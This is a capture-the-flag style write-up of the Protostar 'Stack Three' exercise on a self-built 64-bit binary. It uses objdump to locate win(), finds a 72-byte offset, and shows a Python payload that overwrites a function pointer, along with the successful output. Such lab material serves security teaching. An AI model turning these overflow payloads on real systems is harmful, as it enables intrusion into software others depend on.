<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>
<section>
    <writeup>
        <h1><strong>#Protostar x64 - Stack Three</strong></h1>
        <a href="https://exploit.education/protostar/stack-three/">https://exploit.education/protostar/stack-three/</a><br>
        NOTE 1: Protostar doesn't offer 64-bit versions of the challenges itself. I set it up myself. For setup, refer <a href="../vm-setup/vm-setup.html">here</a><br>
        NOTE 2: I'm writing the 64-bit write-ups as follow-ups to the 32-bit challenges, so I won't be going over the intricacies of the exploit, just the differences involved with it now being a 64-bit challenge instead of 32-bit<br>
        <br>
        <img alt="images\3-1.png" src="images/3-1.png"><br>
        <br>
        The goal of Stack Three is to overflow the <code>buffer</code> variable and overwrite <code>fp</code> with the address of the <code>win()</code> function.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>objdump</strong></h2><br>
        Find the address of the <code>win()</code> function with objdump.<br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack3&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;win<br>
                0000000000400584&nbsp;&lt;win&gt;<span style="color:#ff9d00;font-weight:700">:</span>
            </div>
        </div><br>
        <br>
        <code>win()</code> is located at <code>0x00400584</code>.<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>Overwrite fp</strong></h2><br>
        To overwrite <code>fp</code>, I incrementally increased by 4 how many bytes I'm writing to stack, starting from 64 bytes (the size of the <code>buffer</code> variable).<br>
        <br>
        <code>fp</code> got overwritten at 72 bytes, and I got the win string.<br>
        <br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Three</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">buffer</span>&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">72</span><br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;<span style="color:#ff9d00;font-weight:700">buffer</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400584</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
            <div class="codebox">
                user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;python&nbsp;stack3.py&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack3<br>
                calling&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;pointer,&nbsp;jumping&nbsp;to&nbsp;0x00400584<br>
                code&nbsp;flow&nbsp;successfully&nbsp;changed
            </div>
        </div>
    </writeup>
</section>

</body>
</html>